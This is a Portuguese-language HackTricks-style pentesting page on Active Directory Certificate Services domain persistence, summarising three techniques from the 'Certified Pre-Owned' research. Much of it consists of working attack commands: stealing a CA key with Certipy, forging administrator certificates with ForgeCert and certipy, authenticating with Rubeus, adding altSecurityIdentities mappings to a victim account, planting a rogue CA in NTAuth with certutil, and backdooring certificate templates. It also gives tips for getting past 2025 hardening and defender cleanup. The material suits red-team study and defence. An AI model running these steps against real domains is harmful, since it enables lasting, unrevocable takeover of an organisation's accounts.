# AD CS Persistência de Domínio

{{#include ../../../banners/hacktricks-training.md}}

**Isto é um resumo das técnicas de persistência de domínio compartilhadas em [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Consulte-o para mais detalhes.

## Forjando Certificados com Certificados CA Roubados - DPERSIST1

How can you tell that a certificate is a CA certificate?

Pode-se determinar que um certificado é um certificado CA se várias condições forem atendidas:

- O certificado está armazenado no servidor CA, com sua chave privada protegida pelo DPAPI da máquina, ou por hardware como TPM/HSM se o sistema operacional oferecer suporte.
- Os campos Issuer e Subject do certificado correspondem ao distinguished name da CA.
- Uma extensão "CA Version" está presente exclusivamente nos certificados CA.
- O certificado não possui campos Extended Key Usage (EKU).

Para extrair a chave privada desse certificado, a ferramenta `certsrv.msc` no servidor CA é o método suportado via a GUI integrada. Contudo, este certificado não difere dos demais armazenados no sistema; portanto, métodos como a [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) podem ser aplicados para extração.

O certificado e a chave privada também podem ser obtidos usando Certipy com o seguinte comando:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Após adquirir o certificado da CA e sua chave privada no formato `.pfx`, ferramentas como [ForgeCert](https://github.com/GhostPack/ForgeCert) podem ser utilizadas para gerar certificados válidos:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> O usuário alvo da falsificação de certificado deve estar ativo e ser capaz de autenticar no Active Directory para o processo ter sucesso. Forjar um certificado para contas especiais como krbtgt é ineficaz.

Este certificado forjado será **válido** até a data de término especificada e enquanto o certificado CA raiz for válido (normalmente de 5 a **10+ anos**). Também é válido para **máquinas**, então, combinado com **S4U2Self**, um atacante pode **manter persistência em qualquer máquina do domínio** pelo tempo em que o certificado CA for válido.\
Além disso, os **certificados gerados** com este método **não podem ser revogados**, pois a CA não tem conhecimento deles.

### Operando sob a aplicação rigorosa de mapeamento de certificados (2025+)

Desde 11 de fevereiro de 2025 (após a implantação do KB5014754), os controladores de domínio passam a usar por padrão **Full Enforcement** para mapeamentos de certificados. Na prática isso significa que seus certificados forjados devem ou:

- Conter um vínculo forte com a conta alvo (por exemplo, a extensão de segurança SID), ou
- Ser emparelhado com um mapeamento explícito e forte no atributo `altSecurityIdentities` do objeto alvo.

Uma abordagem confiável para persistência é emitir um certificado forjado encadeado à Enterprise CA roubada e então adicionar um mapeamento explícito e forte ao principal da vítima:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notas
- Se você conseguir criar certificados forjados que incluam a extensão de segurança SID, eles mapearão implicitamente mesmo sob Full Enforcement. Caso contrário, prefira mapeamentos explícitos e fortes. Veja [account-persistence](account-persistence.md) para mais sobre mapeamentos explícitos.
- Revogação não ajuda os defensores aqui: certificados forjados são desconhecidos para o banco de dados da CA e, portanto, não podem ser revogados.

## Confiando em Certificados CA Forjados - DPERSIST2

O objeto `NTAuthCertificates` é definido para conter um ou mais **certificados CA** dentro de seu atributo `cacertificate`, que o Active Directory (AD) utiliza. O processo de verificação pelo **controlador de domínio** envolve checar o objeto `NTAuthCertificates` em busca de uma entrada que corresponda à **CA especificada** no campo Issuer do **certificado** que está autenticando. A autenticação prossegue se for encontrada uma correspondência.

Um certificado CA autoassinado pode ser adicionado ao objeto `NTAuthCertificates` por um atacante, desde que ele tenha controle sobre esse objeto do AD. Normalmente, apenas membros do grupo **Enterprise Admin**, junto com **Domain Admins** ou **Administrators** no domínio raiz da floresta, têm permissão para modificar esse objeto. Eles podem editar o objeto `NTAuthCertificates` usando `certutil.exe` com o comando `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, ou empregando a [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Comandos adicionais úteis para esta técnica:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Essa capacidade é especialmente relevante quando usada em conjunto com um método previamente descrito envolvendo ForgeCert para gerar certificados dinamicamente.

> Considerações de mapeamento pós-2025: colocar uma CA rogue em NTAuth apenas estabelece confiança na CA emissora. Para usar certificados leaf para logon quando os DCs estiverem em **Full Enforcement**, o leaf deve ou conter a extensão de segurança SID ou deve haver um mapeamento explícito forte no objeto alvo (por exemplo, Issuer+Serial em `altSecurityIdentities`). Veja {{#ref}}account-persistence.md{{#endref}}.

## Má Configuração Maliciosa - DPERSIST3

Há muitas oportunidades para **persistência** através de **modificações de descritores de segurança dos componentes do AD CS**. Modificações descritas na seção "[Domain Escalation](domain-escalation.md)" podem ser implementadas maliciosamente por um atacante com acesso elevado. Isso inclui a adição de "control rights" (por exemplo, WriteOwner/WriteDACL/etc.) a componentes sensíveis como:

- O objeto **AD computer do servidor CA**
- O servidor **RPC/DCOM** do servidor CA
- Qualquer **objeto AD descendente ou contêiner** em **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (por exemplo, o contêiner Certificate Templates, o contêiner Certification Authorities, o objeto NTAuthCertificates, etc.)
- **Grupos AD delegados com direitos para controlar o AD CS** por padrão ou pela organização (como o grupo integrado Cert Publishers e quaisquer de seus membros)

Um exemplo de implementação maliciosa envolveria um atacante, que tem **permissões elevadas** no domínio, adicionando a permissão **`WriteOwner`** ao template de certificado padrão **`User`**, com o atacante sendo o principal para esse direito. Para explorar isso, o atacante primeiro mudaria a propriedade do template **`User`** para si. Em seguida, o **`mspki-certificate-name-flag`** seria definido como **1** no template para habilitar **`ENROLLEE_SUPPLIES_SUBJECT`**, permitindo que um usuário forneça um Subject Alternative Name na solicitação. Posteriormente, o atacante poderia **enroll** usando o **template**, escolhendo um nome de **domain administrator** como nome alternativo, e utilizar o certificado adquirido para autenticação como o DA.

Configurações práticas que atacantes podem definir para persistência de longo prazo no domínio (veja {{#ref}}domain-escalation.md{{#endref}} para detalhes completos e detecção):

- Flags de política da CA que permitem SAN de requisitantes (por exemplo, habilitar `EDITF_ATTRIBUTESUBJECTALTNAME2`). Isso mantém caminhos semelhantes ao ESC1 exploráveis.
- DACL do template ou configurações que permitem emissão com capacidade de autenticação (por exemplo, adicionar Client Authentication EKU, habilitar `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlar o objeto `NTAuthCertificates` ou os contêineres de CA para reintroduzir continuamente emissores rogue se os defensores tentarem limpeza.

> [!TIP]
> Em ambientes hardenizados após KB5014754, parear essas más configurações com mapeamentos explícitos fortes (`altSecurityIdentities`) garante que seus certificados emitidos ou forjados permaneçam utilizáveis mesmo quando os DCs aplicarem mapeamento forte.

## Referências

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
{{#include ../../../banners/hacktricks-training.md}}
